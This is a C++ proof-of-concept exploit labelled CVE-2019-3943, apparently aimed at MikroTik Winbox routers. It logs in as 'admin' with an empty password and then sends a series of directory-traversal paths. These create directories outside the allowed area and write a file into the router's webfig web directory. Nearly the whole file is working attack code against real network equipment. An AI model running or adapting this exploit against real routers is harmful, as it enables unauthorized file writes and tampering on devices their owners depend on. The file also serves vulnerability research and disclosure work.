#include <cstdlib>
#include <iostream>
#include <boost/cstdint.hpp>
#include <boost/program_options.hpp>
#include <boost/algorithm/string.hpp>

#include "winbox_session.hpp"
#include "winbox_message.hpp"

namespace
{
    const char s_version[] = "CVE-2019-3943 PoC";

    bool parseCommandLine(int p_argCount, const char* p_argArray[],
                          std::string& p_ip, std::string& p_port)
    {
        boost::program_options::options_description description("options");
        description.add_options()
            ("help,h", "A list of command line options")
            ("version,v", "Display version information")
            ("port,p", boost::program_options::value<std::string>(), "The port to connect to")
            ("ip,i", boost::program_options::value<std::string>(), "The ip to connect to");

        boost::program_options::variables_map argv_map;
        try
        {
            boost::program_options::store(
                boost::program_options::parse_command_line(
                    p_argCount, p_argArray, description), argv_map);
        }
        catch (const std::exception& e)
        {
            std::cerr << e.what() << std::endl;
            std::cerr << description << std::endl;
            return false;
        }

        boost::program_options::notify(argv_map);
        if (argv_map.empty() || argv_map.count("help"))
        {
            std::cerr << description << std::endl;
            return false;
        }

        if (argv_map.count("version"))
        {
            std::cerr << "Version: " << ::s_version << std::endl;
            return false;
        }

        if (argv_map.count("ip") && argv_map.count("port"))
        {
            p_ip.assign(argv_map["ip"].as<std::string>());
            p_port.assign(argv_map["port"].as<std::string>());
            return true;
        }
        else
        {
            std::cout << description << std::endl;
        }

        return false;
    }
}

int main(int p_argc, const char** p_argv)
{
    std::string ip;
    std::string port;
    if (!parseCommandLine(p_argc, p_argv, ip, port))
    {
        return EXIT_FAILURE;
    }

    Winbox_Session winboxSession(ip, port);
    if (!winboxSession.connect())
    {
        std::cerr << "Failed to connect to the remote host" << std::endl;
        return EXIT_FAILURE;
    }
    
    boost::uint32_t p_session_id = 0;
    if (!winboxSession.login("admin", "", p_session_id))
    {
        std::cerr << "[-] Login failed." << std::endl;
        return false;
    }

    WinboxMessage msg;  
    msg.set_to(72,1);
    msg.set_command(6);
    msg.add_string(1, "//./.././.././../pckg/lol");
    msg.set_request_id(1);
    msg.set_reply_expected(true);
    
    winboxSession.send(msg);
    std::cout << "req: " << msg.serialize_to_json() << std::endl;
    msg.reset();

    if (!winboxSession.receive(msg))
    {
        std::cerr << "Error receiving a response." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "resp: " << msg.serialize_to_json() << std::endl;
        
    if (msg.has_error())
    {
        std::cerr << msg.get_error_string() << std::endl;
        return EXIT_FAILURE;
    }
    
    msg.reset();

    msg.set_to(72,1);
    msg.set_command(6);
    msg.add_string(1, "//./.././.././../pckg/lol/home");
    msg.set_request_id(2);
    msg.set_reply_expected(true);
    
    winboxSession.send(msg);
    std::cout << "req: " << msg.serialize_to_json() << std::endl;
    msg.reset();

    if (!winboxSession.receive(msg))
    {
        std::cerr << "Error receiving a response." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "resp: " << msg.serialize_to_json() << std::endl;
        
    if (msg.has_error())
    {
        std::cerr << msg.get_error_string() << std::endl;
        return EXIT_FAILURE;
    }
    
    msg.reset();

    msg.set_to(72,1);
    msg.set_command(6);
    msg.add_string(1, "//./.././.././../pckg/lol/home/web/");
    msg.set_request_id(3);
    msg.set_reply_expected(true);
    
    winboxSession.send(msg);
    std::cout << "req: " << msg.serialize_to_json() << std::endl;
    msg.reset();

    if (!winboxSession.receive(msg))
    {
        std::cerr << "Error receiving a response." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "resp: " << msg.serialize_to_json() << std::endl;
        
    if (msg.has_error())
    {
        std::cerr << msg.get_error_string() << std::endl;
        return EXIT_FAILURE;
    }
    
    msg.reset();
    
    msg.set_to(72,1);
    msg.set_command(6);
    msg.add_string(1, "//./.././.././../pckg/lol/home/web/webfig");
    msg.set_request_id(4);
    msg.set_reply_expected(true);
    
    winboxSession.send(msg);
    std::cout << "req: " << msg.serialize_to_json() << std::endl;
    msg.reset();

    if (!winboxSession.receive(msg))
    {
        std::cerr << "Error receiving a response." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "resp: " << msg.serialize_to_json() << std::endl;
        
    if (msg.has_error())
    {
        std::cerr << msg.get_error_string() << std::endl;
        return EXIT_FAILURE;
    }
    
    msg.reset();
 
    msg.set_to(72,1);
    msg.set_command(1);
    msg.add_string(1, "//./.././.././../pckg/lol/home/web/webfig/lol.txt");
    msg.set_request_id(5);
    msg.set_reply_expected(true);
    
    winboxSession.send(msg);
    std::cout << "req: " << msg.serialize_to_json() << std::endl;
    msg.reset();
    if (!winboxSession.receive(msg))
    {
        std::cerr << "Error receiving a response." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "resp: " << msg.serialize_to_json() << std::endl;
        
    if (msg.has_error())
    {
        std::cerr << msg.get_error_string() << std::endl;
        return EXIT_FAILURE;
    }
    
    p_session_id = msg.get_u32(0xfe0001);
    
    msg.reset();

    msg.set_to(72,1);
    msg.set_command(2);
    msg.set_request_id(6);
    msg.add_u32(0xfe0001, p_session_id);
    msg.add_raw(5, "hello!\n");
    msg.set_reply_expected(true);

    winboxSession.send(msg);
    std::cout << "req: " << msg.serialize_to_json() << std::endl;
    msg.reset();
    if (!winboxSession.receive(msg))
    {
        std::cerr << "Error receiving a response." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "resp: " << msg.serialize_to_json() << std::endl;
        
    if (msg.has_error())
    {
        std::cerr << msg.get_error_string() << std::endl;
        return EXIT_FAILURE;
    }
    
    return EXIT_SUCCESS;
}
